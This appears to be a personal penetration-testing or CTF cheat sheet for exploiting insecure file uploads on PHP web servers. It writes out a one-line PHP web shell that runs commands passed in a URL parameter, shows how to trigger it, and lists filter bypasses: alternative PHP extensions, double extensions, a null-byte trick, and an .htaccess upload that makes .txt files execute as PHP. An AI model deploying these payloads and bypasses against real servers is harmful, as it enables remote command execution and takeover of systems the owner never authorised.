
simple shell to test
echo '<?php system($_GET["cmd"]); ?>' > cmd.php

after uploading cmd.php

on target browser, go to
http://<TARGET_MACHINE>/<PATH_TO_UPLOAD>/shell.php?cmd=id

--------

if webapp does not allow upload of .php


------

3 most common bypasses to try in order of likelihood:

### 1. Alternative PHP Extensions

The server might only be looking for `.php`, but the underlying Apache/Nginx engine might be configured to execute other extensions as PHP code. Try renaming your shell to:

- `.php3`, `.php4`, `.php5`, `.phtml` (Most common bypass)
    
- `.phar` (PHP Archive)
    
- `.phps` (Sometimes shows source, but occasionally executes)
    

**Action:** Try creating a file named `test.phtml` with your code: `<?php system($_GET['cmd']); ?>`.

---

### 2. Double Extensions or Null Byte

If the filter is poorly written, it might only check if the string _ends_ in `.php` or if `.php` exists at all.

- **Double Extension:** `shell.php.jpg` or `shell.php.txt` (Sometimes Apache is misconfigured to execute the first extension it recognizes).
    
- **Null Byte (for older PHP < 5.3.4):** `shell.php%00.jpg`.
    

---

### 3. The `.htaccess` Trick (Powerful)

If you can upload files with **any** extension, see if you can upload a file named exactly `.htaccess`. This is a configuration file for Apache that can change how the server treats files in that directory.

1. Create a file named `.htaccess` locally with this content: `AddType application/x-httpd-php .txt`
    
2. Upload this `.htaccess` file to the server.
    
3. Now, upload your shell as `shell.txt`. Because of the `.htaccess` file, the server will now execute that `.txt` file as if it were PHP.
